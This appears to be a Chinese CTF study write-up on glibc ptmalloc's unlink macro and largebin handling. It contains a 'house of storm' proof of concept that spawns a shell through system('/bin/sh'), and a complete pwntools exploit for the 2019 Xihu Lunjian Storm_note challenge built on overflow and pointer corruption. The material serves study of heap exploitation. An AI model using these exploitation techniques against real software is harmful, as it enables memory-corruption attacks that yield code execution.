# ptmalloc unlink macro analysis

#### unlink source(glibc2.23):

```c
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            
    if (__builtin_expect (chunksize(P) != (next_chunk(P))->prev_size, 0))      
      malloc_printerr (check_action, "corrupted size vs. prev_size", P, AV);  
    FD = P->fd;                                      
    BK = P->bk;                                      
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))              
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  
    else {                                      
        FD->bk = BK;                                  
        BK->fd = FD;                                  
        if (!in_smallbin_range (P->size)                      
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {              
        if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)          
        || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    
          malloc_printerr (check_action,                      
                   "corrupted double-linked list (not small)",    
                   P, AV);                          
            if (FD->fd_nextsize == NULL) {                      
                if (P->fd_nextsize == P)                      
                  FD->fd_nextsize = FD->bk_nextsize = FD;              
                else {                                  
                    FD->fd_nextsize = P->fd_nextsize;                  
                    FD->bk_nextsize = P->bk_nextsize;                  
                    P->fd_nextsize->bk_nextsize = FD;                  
                    P->bk_nextsize->fd_nextsize = FD;                  
                  }                                  
              } else {                                  
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;              
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;              
              }                                      
          }                                      
      }                                          
}
```

check:

+ 在从bin中解链的时候首先会检查与victim相邻的下一个堆块的preszie是否与victim本身的size相等
+ 双向链表完整性检查，即前一个堆块的bk是不是victim，后一个堆块的fd是不是victim
+ 如果是largebin的unlink，还会检查nextsize构成的双向链表完整性

利用姿势：

+ unsafe unlink

+ largebin attack
+ 存在tcache机制时，tcache stashing unlink

largebin：

> 由于largebin结构相对复杂，着重分析下largebin的unlink过程。

+ if (P->fd_nextsize == P)为真，bin中只有相同size的chunk，取走P，FD需要做堆头，所以nextsize指针被赋值
+ 如果FD不是堆头，这时候取下P，FD要充当以前P堆头的作用，所以nextsize指针被赋值
+ 如果FD和P都是堆头，那就比较简单，类似于bk和fd的unlink操作将P从nextsize链取下即可
+ 对于存在多个满足空间的堆块来说，申请出来的是堆头的下一个结点，它的`fd_nextsize`和`bk_nextsize`为空。也就是说即使它是largebin chunk，但是它的`fd_nextsize`也为空，即不满足条件`__builtin_expect (P->fd_nextsize != NULL, 0)`，对于此类chunk的unlink，只会像smallbin的unlink一样检查`fd`与`bk`，而不会对`fd_nextsize`与`bk_nextsize`进行检查与操作

#### largebin利用：house of storm

先给出poc：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void)
{
    unsigned long *large_bin,*unsorted_bin;
    char *ptr;

	void *target = malloc(0x68);

    unsorted_bin=malloc(0x418);
    malloc(0X18);
    large_bin=malloc(0x408);
    malloc(0x18);

    free(large_bin);
    free(unsorted_bin);
    unsorted_bin=malloc(0x418);
    free(unsorted_bin);

    unsigned long fake_chunk=(unsigned long)target-0x10;
    unsorted_bin[0]=0;
    unsorted_bin[1]=fake_chunk;

    large_bin[0]=0;
    large_bin[1]=fake_chunk+8;
    large_bin[2]=0;
    large_bin[3]=fake_chunk-0x18-5;

    ptr=malloc(0x48);
    strcpy(ptr, "/bin/sh\x00");
    system(target);
}
```

其实重点在于 large_bin[3]=(unsigned long)fake_chunk-0x18-5;这样设置bk_nextsize可以在unsortedbin中的chunk整理到largebin中时由于写操作把fakechunk的size部分写成堆地址的最高字节，也就是0x55或0x56(由于pie的原因)，那么最终还是从unsortedbin取出的fakechunk，故需要unsorted_bin[1]=(unsigned long)fake_chunk;这样设置bk，当malloc(0x48)的时候，size是合法的会被取出。这个攻击方法感觉最终还是unsortedbin attack所以在2.29及其以后的版本会失效。

#### 2019西湖论剑Storm_note:

exp

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- author: n0trix -*-

from pwn import *

#context.terminal = ['tmux','splitw','-v']
context.log_level = 'debug'
elf = ELF('./Storm_note')

io = process(elf.path)

def add(size):
    io.sendlineafter('Choice: ','1')
    io.sendlineafter('size ?\n',str(size))

def edit(idx,con):
    io.sendlineafter('Choice: ','2')
    io.sendlineafter('Index ?\n',str(idx))
    io.sendafter('Content: ',con)

def dele(idx):
    io.sendlineafter('Choice: ','3')
    io.sendlineafter('Index ?\n',str(idx))

def backdoor(key):
    io.sendlineafter('Choice: ','666')
    io.recvline()
    io.send(key)

fake_chunk = 0xabcd0100 - 0x10

add(0x18) #0
add(0x408) #1
add(0xf8) #2
add(0x18) #3

add(0x18) #4
add(0x408) #5
add(0xf8) #6
add(0x10) #7 gap

dele(0)
edit(1,0x400*'\x00'+p64(0x430)) #overflow preinuse and set presize
dele(2)
add(0x520) #0
edit(0,0x18*'\x00'+p64(0x411)+0x408*'\x00'+p64(0x101))
#1->unsortedbin
dele(1)
#trigger : 1->largebin size:0x410
add(0x500) #1

dele(4)
edit(5,0x400*'\x00'+p64(0x430)) #same as before
dele(6)
add(0x520) #2
#make a bigger chunk (bigger than largebin) and put into unsortedbin
edit(2,0x18*'\x00'+p64(0x421)+'\x00'*0x418+p64(0xf1))

#5 -> unsortedbin size:0x420
dele(5)

#largebin : write bk_nextsize pointer
edit(0,0x18*'\x00'+p64(0x411)+p64(0)+p64(fake_chunk+8)+p64(0)+p64(fake_chunk-0x18-5))
#unsortedbin : write bk pointer
edit(2,0x18*'\x00'+p64(0x421)+p64(0)+p64(fake_chunk))
#gdb.attach(io)
add(0x48) #4
edit(4,'\x00'*0x30)
backdoor('\x00'*0x30)
io.interactive()
```

